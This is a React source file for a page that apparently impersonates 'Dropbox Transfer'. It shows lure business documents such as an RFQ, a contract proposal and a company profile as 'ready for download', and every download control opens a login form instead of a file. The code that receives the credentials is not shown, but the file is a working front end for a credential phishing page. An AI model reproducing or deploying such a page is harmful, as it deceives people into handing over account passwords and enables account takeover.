import { useEffect, useState } from 'react';
import './App.css';
import { ReactComponent as DownloadIcon } from './download.svg';
import { ReactComponent as Info } from './info.svg';
import Login from './login';
import { ReactComponent as Logo } from './logo.svg';
import { ReactComponent as Ul } from './un.svg';


// import vid4 from './v.mp4';
// import vid5 from './vd.mp4';
// import vid1 from './vi.mp4';
// import vid2 from './vv.mp4';
// import vid3 from './vvv.mp4';
// import v4 from './Secure collaboration with team folders.mp4'



// function returnVideoSrc () {
//     let allArray = [vid1,vid2,vid3,vid4,vid5].reverse()
//     return allArray[Math.round(Math.random()*(allArray.length-1))]
// }


function App() {


 

 
  let [showLogin,setShowLogin] = useState(false)
  let [mount,setMount] = useState(false)
  

  // useEffect(()=>{
  //   if(window.innerWidth<650){
  //     setMount(true)
  //   }
  // },[])


 
  return (
    <div className="App"  >
     <video autoPlay={true} muted loop id="myVideo" src={'https://firebasestorage.googleapis.com/v0/b/file-share-online.appspot.com/o/Secure%20collaboration%20with%20team%20folders.13e716a2.mp4?alt=media&token=568eef3e-2386-482a-910f-7e372742dbbd'} onMouseOver={()=>setMount(true)}>
    </video>

    {/* 2nd */}
    <div className="main-container">
      <div className="header">
        <div className="top-area"> 
          <div className="try-banner">
           <Logo/>
            <p> Dropbox Transfer</p>
          </div>
          <div className="help-banner">
            <Info/>
          </div>
        </div>
      </div>
      {mount && <div className="modal-area" id='mainUI' onMouseOver={e=>e.stopPropagation()}>
        <div className="modal">
          <div className="modal-top">
            <div className="logo-area">
              <img src={"data:image/svg+xml;base64,"} alt=""/>
              <span>
                <Ul/>
              </span>
            </div>
            <div className="top-info">
              <h2>8 items ready for download</h2>
              <p className="size">41.6 MB • Expires in 6 days</p>
            </div>
          </div>
          <div className="modal-content">
            <ul className="files">
              <li className="file">
                <div className="file-info">
                  <div className="file-img">
                    <img src="data:image/png;base64," alt=""/>
                  </div>
                  <div className="file-desc">
                    <p className="file-name">Order Requirement List (RFQ).pdf</p>
                    <p className="file-size">20.6 MB</p>
                  </div>
                </div>
                <div className="file-download" id="download">
                  <DownloadIcon onClick={_=>setShowLogin(true)} />
                </div>
              </li>
              
             
              <li className="file">
                <div className="file-info">
                  <div className="file-img">
                    <img src="data:image/png;base64," alt=""/>
                  </div>
                  <div className="file-desc">
                    <p className="file-name">Drawing Specifications.xlsx</p>
                    <p className="file-size">4 MB</p>
                  </div>
                </div>
                <div className="file-download" id="download">
                  <DownloadIcon onClick={_=>setShowLogin(true)}/>
                </div>
              </li>
              <li className="file">
                <div className="file-info">
                  <div className="file-img">
                    <img src="data:image/png;base64," alt=""/>
                  </div>
                  <div className="file-desc">
                    <p className="file-name">Contract Proposal.pdf</p>
                    <p className="file-size">4.6 MB</p>
                  </div>
                </div>
                <div className="file-download" id="download">
                  <DownloadIcon onClick={_=>setShowLogin(true)}/>
                </div>
              </li>
              <li className="file">
                <div className="file-info">
                <div className="file-img">
                    <img src="data:image/png;base64," alt=""/>
                  </div>
                  <div className="file-desc">
                    <p className="file-name">Company Profile.pdf</p>
                    <p className="file-size">4 MB</p>
                  </div>
                </div>
                <div className="file-download" id="download">
                  <DownloadIcon onClick={_=>setShowLogin(true)}/>
                </div>
              </li>
              <li className="file">
                <div className="file-info">
                <div className="file-img">
                    <img src="data:image/png;base64," alt=""/>
                  </div>
                  <div className="file-desc">
                    <p className="file-name">Acknowledgment.pdf</p>
                    <p className="file-size">4 MB</p>
                  </div>
                </div>
                <div className="file-download" id="download">
                  <DownloadIcon onClick={_=>setShowLogin(true)}/>
                </div>
              </li>
            </ul>
          </div>
          <div className="modal-footer">
            <div>
              <p id="download" onClick={_=>setShowLogin(true)}>Save Files</p>
            </div>
            <div>
              <button id="download" onClick={_=>setShowLogin(true)}>Download all</button>
            </div>
          </div>
        </div>
      </div>}
    </div>

    {/* end  */}
    {showLogin && <Login hide={_=>setShowLogin(false)}/>}
    </div>
  );
}

export default App;


